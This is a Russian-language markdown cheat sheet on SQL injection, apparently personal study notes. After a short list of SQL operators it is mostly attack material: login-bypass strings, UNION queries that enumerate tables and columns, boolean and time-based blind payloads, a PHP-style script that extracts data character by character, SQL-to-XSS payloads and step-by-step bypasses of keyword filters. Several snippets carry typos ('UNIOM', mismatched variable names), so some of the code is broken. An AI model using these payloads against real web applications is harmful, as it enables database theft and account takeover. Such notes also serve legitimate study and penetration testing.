# ****Операторы:****

## ***1. Операторы определения данных.***

1.1 **CREATE** - создание объекта.

1.2 **ALTER** - изменение объекта.

1.3 **DROP** - удаление объекта.


## ***2. Операторы манипуляции с данными.***

2.1 **SELECT** - выбор данных.

2.2 **INSERT** - добавление данных.

2.3 **UPDATE** - изменение данных.

2.4 **DELETE** - удаление данных.

2.5 **UNION** - объединяет два запроса в один.


## ***3. Операторы доступа к данным.***

3.1 **GRANT** - разрешение на манипуляции с объектом.

3.2 **REVOKE** - отзывает разрешения.

3.3 **DENY** - запрет.


# ****Виды SQL-injection:****

## ***1. Тип переменной.**

### **1.1 Числовой параметр.**

Ex: 
```sql
SELECT * FROM somthing WHERE id=$id (не обрамлен кавычками)
```

Если подставить ', то вылетит ошибка.
Если ошибка не вылетела:

* Инъекции нет.
    
* ' фильтруются.
    
* Выкл. вывод ошибок (blind inj)


### **1.2. Строковый параметр.**

Ex: 
```sql
SELECT * FROM somthing WHERE id='1" (обрамлен кавычками)
```
Если добавить ', то нарушится логика запроса. 

### **1.3. Авторизация.**

*login и password.*

Ex: 
```sql
SELECT * FROM  users WHERE login='login' and password='password'
```

Уязвимость в login:
```sql
SELECT * FROM users WHERE login='admin'-- and password='password'
```

*Уязвимость в password:*
```sql
password' OR login='admin'--
```

### ***1.4. Оператор LIKE.***

Для оператора LIKE символ % - любая строка. 

Авторизация. В поле password вводим %

Ex: 
```sql
SELECT * FROM users WHERE login LIKE 'admin' AND password LIKE '%'
```

## ****2. Тип инъекций.****


### ***2.1 UNION-based***

- У всех запросов должно быть одинаковое кол-во столбцов в запросе.
- 
- Полное совпадение типов столбцов.
- 
Ex:
запрос 1 = SELECT id, user FROM users WHERE id=1

запрос 2 = SELECT user, password FROM passwords WHERE id=1
```sql
SELECT user, value FROM table_1 UNION SELECT user, value FROM table_2 (добавление ALL после UNION выводит дубликаты)
```

Запрос который ничего не выведет.
```sql
SELECT user, date FROM table_1 UNION SELECT value FROM table_2 (несовпадение количества столбцов)
```

Запрос который ничего не выведет.
```sql
SELECT user, date FROM table_1 UNION SELECT user, string FROM table_2 (несовпадение типов столбцов)
```

Ex: 
http://something.com/logs.php?id=1 (адресная строка)
```sql
SELECT Users.user, Logs.log FROM Users, Logs WHERE Logs.sid=$id
```

Запрос на таблицы в базе:
```sql
http://something.com/logs.php?id=1 UNION SELECT TOP 10 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
```
Запрос на имена колонок:
```sql
http://something.com/logs.php?id=1 UNION SELECT TOP 10 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="table name"--
```

По итогу получения названия всех колонок и таблиц можно получить логи всех пользователей:
```sql
http://something.com/logs.php?id=1 UNION SELECT Users.user, Logs.lo FROM Users, Logs WHERE Logs.sid = Users.id
```

## ***2.2 Blind injection***

Не отображает ответы ошибок.

### ***Normal blind***

Ex: 
http://test.com/something.php?id=1
```sql
SELECT title, descr, body FROM something WHERE id=$id
http://test.com/something.php?id=1 and 1=1 (вернет то же самое)
http://test.com/something.php?id=1 and 1=0 (никогда не выполнится)
SELECT title, descr, body FROM something WHERE id=$id AND 1=0
```

***Payloads для определения Blind-inj***
```sql
AND true
AND false
'AND true-- -
'AND false-- -
'AND true %23
'AND false %23
```

**Эксплуатация.**
```sql
SELECT title, descr, body FROM something WHERE id=$id AND ASCII(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1), 1,1))>100
SELECT title, descr, body FROM something WHERE id=$id AND X>100
```

**ASCII(symbol)** - возвращение кода символа по ascii

**substring(string, start_symbol, count_symbol)** - возвращение подстроки и строки

**SELECT table_name** - получить название таблицы.


Если Х>100 вернёт true(страница появилась), то название таблицы начинается не с ascii 100, а если вернет false(страница пропала), то начинается с ascii 100. 
Методом перебора узнаем название таблицы.

------Другой способ
Использование dual и LIKE.
% - строка произвольной длины.
_ - любой символ.

Ex: 
'something.com' LIKE '%thing%' - true.
'something.com' LIKE '%.c' - false.

'test.com' LIKE '___t.c__' - true.
'test.com' LIKE '___t.c_' - false.

```sql
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() LIKE '%n%')
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() LIKE '_______')
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() = 'name_bd')
```

**Получение имен таблиц через столбцы.**
```sql
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1) LIKE '%')
```

**Запрос состоит из 2х вложенных запросов.**

1.
```sql
SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1
```   
**SELECT table_name** - выдай имя таблицы.
   
**FROM information_schema.columns** - из данных колонок.
   
**WHERE table_schema = database()** - где, БД равна текущей.
   
**AND column_name LIKE '%user%'** - и таблица содержит столбец в названии которого есть user.
   
**limit 0,1** - 1шт

Если в БД есть таблица со столбцом содержащим **user**, то этот запрос вернёт имя таблицы. Например ***some_table_name***

2.
```sql
SELECT 1 FROM dual WHERE some_table_name LIKE '%'
```
Проверка на строку. Если вернул строку - **true**, иначе - **false**

**Узнать имя таблицы.**

Узнаём кол-во символов в названии таблицы
```sql
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1) LIKE '_____')
SELECT 1 FROM dual WHERE some_table_name LIKE '____'
```

**Узнаём какие именно символы входят в название таблицы**
```
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1) LIKE '%s%')
SELECT 1 FROM dual WHERE some_table_name LIKE '%s%'
```

***Проверка итогового варианта***
```sql
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1) LIKE 'users')
```



# **DOUBLE BLIND SQL INJECTION(Time-based sql injection)**

**Определение** основано на задержках в выполнении.
```sql
id' and sleep(10)--
```

**Эксплуатация** основана на посимвольном переборе с учетом временных задержек.
```sql
id=1' and if (Ascii(substring((SELECT user()),1,1))>97, sleep(10),0)--
```

Расшифровка:

**substring((SELECT user()),1,1)** - возвращает строку с результатом. *substring* возвращает первый символ строки.

**(Ascii(substring((SELECT user()),1,1))** - **ASCII** возвращает код символа. Проверка на букву.

**sleep(10)** - если первый символ это буква, то функция останавливает выполнение на 10 сек.

***Посимвольная проверка скриптом***
```js
function brute($column,$table,$lim) { // задаются аргументы(колонки, таблица, кол-во строк)
    $ret_srt = "";                    // тут будет храниться результат.
    $b_str = "1234567890_abcdefghijklmnopqrstuvwxyz";  // строка для брута.
    $b_arr = str_split($b_str);       // массив с символами из строки для брута

    for($i=1; $i<100; $i++) {         // цикл 100 итераций
        print "[+] Brute $i symbol...\n";    // выводит какой именно символ брутится в данный момент 

        for($j=0; j<count($b_arr); $j++) {  // Цикл по массиву (символы для брута)
            $brute = ord($b_arr[$j]);        //Приведние к символа к ASCII.Инициализация переменной brute.
            $q = "/**/and/**/if((ord(lower(mid((select/**/$column/**/from/**/$table/**/limit/**/$lim,1),$i,1))))=$brute,sleep(6),0)--";  //Переменная с нагрузкой
            if(http_connect($q)) {  // делается запрос
                $ret_str = $ret_str.$b_arr[$j]; // если символ подошёл, то дописываем в переменную.
                print $b_arr[$j].\n;    // выводим подошедший символ.
                break;
            }
            print "."; // декор
        }
        if($j == count($b_arr)) // проверка на последний сиввол из строки для брута.
            break;
    }
    return $ret_str; //результат
}
```

## ***Частотный анализ***
```js
function brute($column,$table,$lim)
{
    $ret_str = "";
    $b_str = "tashwiobmcfdplnergyuvkjqzx_1234567890";
    $b_arr = str_split($b_str);

    for ($i=1;$i<100;$i++)
    {
        if($last_ltr){
            switch ($last_ltr){
                case "q": { $b_arr = str_split("uaqoisvretwybnhlxmfpzcdjgk_1234567890");}
                case "w": { $b_arr = str_split("ahieonsrldwyfktubmpcgzvjqx_1234567890");}
                case "e": { $b_arr = str_split("rndsaletcmvyipfxwgoubqhkzj_1234567890");}
                case "r": { $b_arr = str_split("eoiastydnmrugkclvpfbhwqzjx_1234567890");}
                case "t": { $b_arr = str_split("hoeiartsuylwmcnfpzbgdjkxvq_1234567890");}
                case "y": { $b_arr = str_split("oesitamrlnpbwdchfgukzvxjyq_1234567890");}
                case "u": { $b_arr = str_split("trsnlgpceimadbfoxkvyzwhjuq_1234567890");}
                case "i": { $b_arr = str_split("ntscolmedrgvfabpkzxuijqhwy_1234567890");}
                case "o": { $b_arr = str_split("nurfmtwolspvdkcibaeygjhxzq_1234567890");}
                case "p": { $b_arr = str_split("eroaliputhsygmwbfdknczjvqx_1234567890");}
                case "l": { $b_arr = str_split("eliayodusftkvmpwrcbgnhzqxj_1234567890");}
                case "k": { $b_arr = str_split("einslayowfumrhtkbgdcvpjzqx_1234567890");}
                case "j": { $b_arr = str_split("euoainkdlfsvztgprhycmjxwbq_1234567890");}
                case "h": { $b_arr = str_split("eaioturysnmlbfwdchkvqpgzjx_1234567890");}
                case "g": { $b_arr = str_split("ehroaiulsngtymdwbfpzkxcvjq_1234567890");}
                case "f": { $b_arr = str_split("oeriafutlysdngmwcphjkbzvqx_1234567890");}
                case "d": { $b_arr = str_split("eioasruydlgnvmwfhjtcbkpqzx_1234567890");}
                case "s": { $b_arr = str_split("tehiosaupclmkwynfbqdgrvjzx_1234567890");}
                case "a": { $b_arr = str_split("ntrsldicymvgbpkuwfehzaxjoq_1234567890");}
                case "z": { $b_arr = str_split("eiaozulywhmtvbrsgkcnpdjfqx_1234567890");}
                case "x": { $b_arr = str_split("ptcieaxhvouqlyfwbmsdgnzrkj_1234567890");}
                case "c": { $b_arr = str_split("oheatikrlucysqdfnzpmgxbwvj_1234567890");}
                case "v": { $b_arr = str_split("eiaoyrunlsvdptjgkhcmbfwzxq_1234567890");}
                case "b": { $b_arr = str_split("euloyaristbjmdvnhwckgpfzxq_1234567890");}
                }
        }
        print "[+] Brute $i symbol...\n";
            for ($j=0;$j<count($b_arr);$j++) {
                $brute = ord($b_arr[$j]);
                $q = "/**/and/**/if((ord(lower(mid((select/**/$column/**/from/**/$table/**/limit/**/$lim,1),$i,1))))=$brute,sleep(6),0)--";
                    if (http_connect($q)){
                        $ret_str=$ret_str.$b_arr[$j];
                        print $b_arr[$j]."\n";
                        $last_ltr=$b_arr[$j];
                            break;
                    }
                    print ".";
            }
            if ($j == count($b_arr)) break;
    }
    return $ret_str;
}
```



# **ROUTED SQL INJECTION**

Не даёт результата, но указывает на место, где можно провести инъекцию.

**Пример.**

http://ex.com/index.php?id=1

Количество колонок.
```sql
http://ex.com/index.php?id=1' UNIOM SELECT 1,2,3 --
```
Вместо столбца подставляем:
```sql
"x'"
```

В запросе:
```sql
http://ex.com/index.php?id=1' UNIOM SELECT 1,2,"3'" --
```

Запрос для колонок:
```sql
http://ex.com/index.php?id=1' UNIOM SELECT 1,2,"3' UNION SELECT 1,2,3,4" --

```
Также можно использовуть обфускацию например по hex и вставлять в запрос. 
```sql
"1'" = 0x22312722
```


# **SiXSS**
Union-based и Error-based  позволяют провести XSS атаки.
```sql
id=-1' UNION SELECT 1,<script>alert('1337');</script>--
```


# **Обход фильтрации функций и ключевых слов.**

## **1.**

### Фильтруемые ключевые слова:
```
and, or
```

### **Код PHP-фильтра:**
```php
preg_match('/(and|or)/i', $id)
```

### **Отфильтрованная инъекция:**
```sql
1 or 1 = 1 1 and 1 = 1
```

### **Пропущенная инъекция:**
```sql
1 || 1 = 1 1 && 1 = 1
```

## **2.**

### Фильтруемые ключевые слова:
```
and, or, union
```

### **Код PHP-фильтра:**
```php
preg_match('/(and|or|union)/i', $id)
```

### **Отфильтрованная инъекция:**
```sql
union select user, password from users
```

### **Пропущенная инъекция:**
```sql
1 || (select user from users where user_id=1)='admin'
```

## **3.**

### Фильтруемые ключевые слова:
```
and, or, union, where
```

### **Код PHP-фильтра:**
```php
preg_match('/(and|or|where|union)/i', $id)
```

### **Отфильтрованная инъекция:**
```sql
1 || (select user from users where user_id=1)='admin'
```

### **Пропущенная инъекция:**
```sql
1 || (select user from users limit 1)='admin'
```

## **4.**

### Фильтруемые ключевые слова:
```
and, or, union, where, limit
```

### **Код PHP-фильтра:**
```php
preg_match('/(and|or|where|limit|union)/i', $id)
```

### **Отфильтрованная инъекция:**
```sql
1 || (select user from users limit 1)='admin'
```

### **Пропущенная инъекция:**
```sql
1 || (select user from users group by user_id having user_id = 1)='admin'
```

## **5.**

### Фильтруемые ключевые слова:
```
and, or, union, where, limit, group by
```

### **Код PHP-фильтра:**
```php
preg_match('/(and|or|where|limit|group by|union)/i', $id)
```

### **Отфильтрованная инъекция:**
```sql
1 || (select user from users group by user_id having user_id = 1)='admin'
```

### **Пропущенная инъекция:**
```sql
1 || (select substr(group_concat(user_id),1,1)user from users)=1
```






















